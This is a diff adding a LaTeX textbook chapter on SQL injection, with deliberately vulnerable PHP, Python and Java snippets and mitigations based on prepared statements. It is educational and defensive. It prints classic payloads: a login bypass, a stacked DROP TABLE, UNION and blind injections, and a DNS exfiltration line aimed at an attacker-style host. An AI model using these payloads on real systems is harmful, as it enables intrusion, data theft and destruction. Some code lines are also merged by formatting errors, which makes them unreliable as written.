@@ -1,2 +1,303 @@
-\chapter{SQL Injection}
+\chapter{\texorpdfstring{\glsfmtfull{sqli}}{SQL Injection (SQLi)}}
+Often, web applications use a \gls{sql} relational database to execute queries for accessing and managing data. \glsxtrlong{sqli} is a critical vulnerability that allows a malicious user to inject undesired \gls{sql} code into these queries, which is then inadvertently executed by the backend database engine.
 
+\begin{description}
+    \item[Severity] Very Severe
+    \item[Priority] High (often)
+    \item[Prevalence] Frequently discovered
+    \item[Scope] All software that interacts with a \gls{sql} database
+    \item[Technical Impact] Direct access to database contents and system information
+    \item[Worst-Case Consequences] Full system compromise
+\end{description}
+
+\noindent \glsxtrlong{sqli} remains highly relevant because a vast majority of online applications rely on at least one database, and given the structured nature of business data, these are often relational \gls{sql} databases. Despite being one of the oldest known web vulnerabilities—and despite the existence of comprehensive secure coding guidelines—it continues to account for a significant portion of all reported vulnerabilities.
+
+\paragraph{Underlying Idea}
+Let us assume our application uses the following \gls{sql} query to process user logins, querying a \texttt{users (k, userId, password, ...)} table:
+
+\begin{lstlisting}[language=SQL]
+SELECT * FROM users WHERE userId = '<user_id>' AND password = '<user_password>';
+\end{lstlisting}
+
+Normally, an \gls{http} request for the login is performed by the client (frontend). The server (backend) reads the parameters, substitutes them into the query, and returns the appropriate row only if the username and password match exactly.
+
+However, a malicious user can input specially crafted characters instead of a normal username. For example, if the attacker inputs \texttt{admin' --} as the username, the concatenated query executed by the server becomes:
+
+\begin{lstlisting}[language=SQL]
+SELECT * FROM users WHERE userId = 'admin' -- ' AND password = '<user_password>';
+\end{lstlisting}
+
+The result is catastrophic! Because \texttt{--} signifies the start of a comment in \gls{sql}, the database engine completely ignores the password check. The query simply searches for a user named \texttt{admin} and successfully logs the attacker into that account without ever validating a password.
+
+\paragraph{Flow and Steps} 
+First, the attacker identifies a vulnerable application. Next, a malicious \gls{sql} query is crafted and embedded within an \gls{http} request, bypassing the application's intended security measures. The database executes the injected query, and the response is received by the malicious user, allowing them to extract, alter, or destroy sensitive data.
+
+\paragraph{Examples in Different Languages}
+The core mechanism behind a \glsxtrshort{sqli} vulnerability is always the same: untrusted user input is directly concatenated into a database query string instead of being safely parameterized. Below are examples of how this vulnerability manifests across different programming languages.
+
+\textbf{Legacy PHP (< 7.0)}
+\begin{lstlisting}[language=PHP]
+<?php
+// https://mycompany.com/get_customer.php?id=1
+$id =$_GET["id"];
+// ...
+$query = "SELECT * FROM customers WHERE id =" . $id;
+$result = mysql_query($query);
+
+for ($i = 0; $i < mysql_num_rows($result);$i++) {
+    echo mysql_result($result,$i);
+}
+?>
+\end{lstlisting}
+
+\textbf{PHP (mysqli)}
+\begin{lstlisting}[language=PHP]
+<?php
+$id =$_GET["id"];
+// ... $conn = mysqli_connect(...);
+
+// The variable $id is directly interpolated into the string$query = "SELECT * FROM customers WHERE id = $id";
+$result = mysqli_query($conn,$query);
+
+while ($row = mysqli_fetch_array($result)) {
+    echo $row['name'] . '<br>';
+}
+?>
+\end{lstlisting}
+
+\textbf{Python}
+\begin{lstlisting}[language=Python]
+def select_customer(id: str) -> str:
+    with connection.cursor() as cursor:
+        # Vulnerable string formatting using %s
+        cursor.execute("SELECT * FROM customers WHERE id = '%s'" % id)
+        result = cursor.fetchone()
+        admin = result[0]
+        return admin
+\end{lstlisting}
+
+\textbf{Java}
+\begin{lstlisting}[language=Java]
+// https://mycompany.com/get_customer.php?id=1
+String id = request.getParameter("id");
+
+// Vulnerable string concatenation
+String query = "SELECT * FROM customers WHERE id = " + id;
+
+try {
+    // ...
+    Statement statement = connection.createStatement();
+    ResultSet results = statement.executeQuery(query);
+    // ...
+} catch (SQLException e) {
+    e.printStackTrace();
+}
+\end{lstlisting}
+
+All of the examples above will fail to protect the database if the input string is manipulated. For instance, an input like \texttt{1 OR 2>1} will cause the condition to evaluate to true for every row in the table, effectively bypassing authentication or data isolation measures. 
+
+Furthermore, attackers can execute entirely new, malicious operations by terminating the original statement with a semicolon (\texttt{;}) and appending a second query. For example:
+
+\begin{lstlisting}[language=SQL]
+SELECT * FROM customers WHERE id = 1; UPDATE account SET balance = 0;
+SELECT * FROM customers WHERE id = 1; DROP TABLE account;
+\end{lstlisting}
+
+\noindent The fundamental problem underlying \gls{sqli} is that user-provided data is directly concatenated into a \gls{sql} query string without any sanitization, escaping, or the use of parameterized statements.
+
+\section{Different Types of \glsfmtshort{sqli}} 
+\gls{sqli} vulnerabilities can be classified into different typologies based on how the attacker interacts with the database and extracts the data. They generally fall into three main categories:
+
+\begin{itemize}
+    \item \textbf{In-Band \gls{sqli}}: The attacker uses the same communication channel to both launch the attack and gather the results. This is the most common and straightforward method to exploit.
+    \begin{itemize}
+        \item \textbf{Classic:} The traditional version where the results of the injected query are directly returned and displayed in the application's \gls{http} response.
+        \item \textbf{Error-Based:} The attacker intentionally forces the database to generate an error or exception. These raw error messages often leak sensitive information about the system architecture, database type, or table structure.
+        \item \textbf{Union-Based:} Used alongside or instead of error-based techniques, this leverages the \gls{sql} \texttt{UNION} operator to combine the results of the original query with a custom injected \texttt{SELECT} statement, forcing the application to display exfiltrated data.
+\begin{lstlisting}[language=SQL]
+-- Example: Extracting table names using a UNION payload
+' UNION SELECT 1, 2, 3, 4, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()) --
+\end{lstlisting}
+    \end{itemize}
+    
+    \item \textbf{Inferential (Blind) \gls{sqli}}: The attacker cannot see the result of the query directly on the page. Instead, they must reconstruct the database structure piece by piece by observing the application's behavioral responses to specific payloads.
+    \begin{itemize}
+        \item \textbf{Boolean-Based:} The attacker uses boolean conditions to verify valid/invalid data. By observing if the application returns a "normal" page (TRUE) or a "missing/default" page (FALSE), they can deduce internal database logic.
+\begin{lstlisting}[language=SQL]
+-- Example 1: Evaluates to FALSE (1 is valid, but 1=2 is false).
+-- Result: Often returns no answer or a default error page.
+'1' AND 1=2; --
+
+-- Example 2: Evaluates to TRUE (1 is valid, and 1=1 is true).
+-- Result: Often returns a valid page, differentiating it from Example 1.
+'1' AND 1=1; --
+\end{lstlisting}
+        \item \textbf{Time-Based:} When the application does not return different responses for TRUE/FALSE conditions (completely blind), the attacker relies on database pause commands to infer data based on response latency.
+\begin{lstlisting}[language=SQL]
+-- Example: If the injection is successful, the database will wait 10 seconds before responding to the HTTP request.
+1' AND sleep(10); --
+\end{lstlisting}
+    \end{itemize}
+    
+    \item \textbf{Out-of-Band \gls{sqli}}: The attacker triggers the database system to create an out-of-band network connection (such as a DNS or \gls{http} request) to an external server they control in order to exfiltrate data. This is typically used when the server is too slow for Time-Based attacks or when In-Band extraction is impossible.
+\begin{lstlisting}[language=SQL]
+-- Example: Forcing the database to resolve a DNS lookup that contains the database version in the subdomain.
+1'; SELECT load_file(concat('\\\\', version(), '.dvwa.hacker.com\\s.txt')); --
+\end{lstlisting}
+\end{itemize}
+
+\section{\glsfmtshort{sql} Injection Mitigation}
+To defend against \gls{sqli}, developers must ensure that user-supplied data is never executed as active code by the database interpreter. The following mitigation strategies vary in complexity and effectiveness:
+
+\begin{enumerate}
+    \item \textbf{Input Escaping / Neutralization (Effectiveness: \textcolor{red}{LOW})} \\
+    Attempting to escape all user-supplied input is only a partial prevention. Neutralizing or sanitizing every possible input vector is a highly complex task and is prone to developer error or bypass techniques.
+    
+    \item \textbf{Allow-List Input Validation (Effectiveness: \textcolor{red}{LOW})} \\
+    This technique ensures that only explicitly defined, expected inputs are accepted, rejecting everything else. While better than block-listing, it is still insufficient on its own for complex inputs.
+    
+    \item \textbf{Principle of Least Privilege (Effectiveness: \textcolor{orange}{MEDIUM})} \\
+    Configure the database user account used by the application to have the absolute minimum privileges necessary. If a \gls{sqli} vulnerability is discovered, this prevents the attacker from dropping tables, accessing other databases, or executing system commands.
+    
+    \item \textbf{Properly Constructed Stored Procedures (Effectiveness: \textcolor{olive}{HIGH-})} \\
+    A stored procedure is \gls{sql} code prepared and saved directly in the database. The application simply calls the procedure with parameters. This acts similarly to prepared statements, but it is \textit{only a partial prevention}: if the stored procedure internally concatenates variables to build dynamic queries, it remains vulnerable.
+    
+    \item \textbf{Prepared Statements / Parameterized Queries (Effectiveness: \textcolor{green!60!black}{HIGH})} \\
+    This is the primary and most robust defense. Programming languages use predefined structures to compose \gls{sql} queries, sending the query structure and the user data as completely separate packets to the database. The database treats the input strictly as data (literals), never as executable code.
+\end{enumerate}
+
+\paragraph{Mitigation via Sanitization (Legacy)}
+Before prepared statements became standard, developers relied heavily on strict input sanitization. In these examples, the application uses Regular Expressions (Regex) to aggressively enforce that the `id` parameter contains \textit{only} numbers before executing the query.
+
+\textbf{Legacy PHP (Regex Validation)}
+\begin{lstlisting}[language=PHP]
+<?php
+$id =$_GET["id"];
+
+// Accepts only an $id that contains digits (length between 1 to 8)
+if (preg_match('/^\d{1,8}$/', $id)) {$query = "SELECT name FROM customers WHERE id =" . $id;
+    $result = mysql_query($query);
+    
+    for ($i = 0; $i < mysql_num_rows($result);$i++) {
+        echo mysql_result($result,$i);
+    }
+}
+?>
+\end{lstlisting}
+
+\textbf{Java (Regex Validation)}
+\begin{lstlisting}[language=Java]
+String idp = request.getParameter("id");
+
+// Validate that the input is strictly a numeric digit/decimal
+if (idp != null && idp.matches("-?\\d+(\\.\\d+)?")) {
+    String query = "SELECT name FROM customers WHERE id = " + idp;
+    try {
+        Statement statement = connection.createStatement();
+        ResultSet results = statement.executeQuery(query);
+        // Process results...
+    } catch (SQLException e) {
+        e.printStackTrace();
+    }
+}
+\end{lstlisting}
+
+\paragraph{Mitigation via Prepared Queries}
+Modern applications should always use parameterized queries. Note how the \gls{sql} string uses placeholders (like \texttt{?} or \texttt{\%s}), and the actual user input is bound to the statement later.
+
+\textbf{PHP (Procedural mysqli)}
+\begin{lstlisting}[language=PHP]
+<?php
+$id =$_GET["id"];
+$conn = mysqli_connect("localhost", "user", "pass", "db");
+
+// Use '?' as the placeholder
+$query_str = "SELECT name FROM customers WHERE id = ?";
+$stmt = mysqli_prepare($conn,$query_str);
+
+// Bind the parameter ('i' denotes integer type)
+mysqli_stmt_bind_param($stmt, "i", $id);
+mysqli_stmt_execute($stmt);
+mysqli_stmt_bind_result($stmt,$name);
+
+while (mysqli_stmt_fetch($stmt)) {
+    printf("%s \n", $name);
+}
+?>
+\end{lstlisting}
+
+\textbf{PHP (Object-Oriented mysqli)}
+\begin{lstlisting}[language=PHP]
+<?php
+$id =$_GET["id"];
+$mysqli = new mysqli("localhost", "user", "pass", "db");
+
+$query_str = "SELECT name FROM customers WHERE id = ?";
+$stmt = $mysqli->prepare($query_str);
+
+$stmt->bind_param("i", $id);$stmt->execute();
+$stmt->bind_result($name);
+
+while ($stmt->fetch()) {
+    printf("%s\n", $name);
+}
+?>
+\end{lstlisting}
+
+\textbf{Python}
+\begin{lstlisting}[language=Python]
+def select_customer(id: str) -> str:
+    with connection.cursor() as cursor:
+        # Use %s WITHOUT quotes; the driver handles parameterization safely
+        cursor.execute("SELECT name FROM customers WHERE id = %s", (id,))
+        result = cursor.fetchone()
+        
+        if result is None:
+            return ""
+            
+        admin = result[0]
+        return admin
+\end{lstlisting}
+
+\textbf{Java}
+\begin{lstlisting}[language=Java]
+// Ensure connection is established
+Connection con = DriverManager.getConnection(url, user, pass);
+String idp = request.getParameter("id");
+
+// Use '?' as the placeholder
+String query = "SELECT name FROM customers WHERE id = ?";
+PreparedStatement myStmt = con.prepareStatement(query);
+
+// Bind the parameter safely (prevents injection even if parsed as String)
+myStmt.setInt(1, Integer.parseInt(idp));
+// Alternatively: myStmt.setString(1, idp);
+
+ResultSet myRs = myStmt.executeQuery();
+\end{lstlisting}
+
+\section{Tools and Affected Technologies}
+
+\paragraph{Automated Testing Tools}
+Several open-source penetration testing tools can automate the detection and exploitation of \gls{sqli} vulnerabilities:
+\begin{itemize}
+    \item \textbf{SQLmap:} A powerful tool that automates the process of detecting and exploiting \gls{sqli} flaws, often allowing attackers to take full control of database servers.
+    \item \textbf{jSQL Injection:} A lightweight, open-source Java application used to extract database information from a remote server. It is included by default in Kali Linux.
+    \item \textbf{\gls{owasp} ZAP \& FuzzDB:} ZAP is an open-source web application scanner. It can be paired with FuzzDB, which contains comprehensive lists of attack payload primitives for fault injection testing (including \gls{sqli}, \gls{xss}, etc.).
+\end{itemize}
+
+\paragraph{Affected Languages}
+All programming languages that interface directly with a database are potentially affected. Even low-level languages (like C and C++) can be compromised if they construct queries dynamically. Furthermore, \gls{sql} itself is vulnerable; for example, poorly implemented stored procedures (prepared \gls{sql} statements saved for reuse) can still suffer from injection if they concatenate strings internally instead of safely parameterizing data.
+
+\section{Chapter Summary}
+
+\begin{concept}{Core \glsfmtshort{sqli} Concepts}{sqli-summary}
+    \textbf{The Fundamental Problem:} User-provided data is directly concatenated into a \gls{sql} query string. An attacker provides malformed data aimed at escaping the data context and altering the active semantics of the query.
+    
+    \textbf{Primary Defenses:}
+    \begin{itemize}
+        \item \textbf{Use Prepared Statements:} Always use parameterized \gls{sql} queries instead of constructing queries via string concatenation or replacement.
+        \item \textbf{Input Validation:} Validate any input that goes into a \gls{sql} query (e.g., using strict regular expressions or allow-lists) as a secondary defense layer.
+        \item \textbf{Least Privilege \& Abstraction:} Grant access to tables only through securely written stored procedures, and ensure the database user operates with the minimal required permissions.
+    \end{itemize}
+\end{concept}
